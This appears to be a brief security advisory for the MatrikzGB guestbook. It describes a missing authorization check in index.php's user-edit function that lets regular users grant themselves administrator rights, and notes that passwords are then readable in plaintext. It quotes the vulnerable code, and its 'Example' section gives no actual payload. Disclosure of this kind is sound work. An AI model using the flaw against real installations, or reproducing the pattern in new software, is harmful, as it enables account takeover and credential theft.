Vulnerable Versions: 
Version 2.0 and prior 
Version 3   (not tested) 
 
Summary: 
MatrikzGB was written by Thomas Hempel for 
www.onsite.org. 
A bug in index.php allows a user with a regular user 
account to give administrator rights to himself. 
 
Details: 
The bug is in the user edit function: 
Every regular user is allowed to chanche rights or do any 
modifications on existing users. 
 if ($new_username != "" && $new_password != "") { 
create_user($new_username,$new_password,$new_rights,$entry_index); 
echo "<tr><th class=\"ok\">Der Benutzer wurde angelegt!"; 
 
Example: 
This is a example how to give administrator rights to 
yourself.

Comment: 
When you got administrator rights,you can look up the 
passwords of all other users,they are in plaintext.
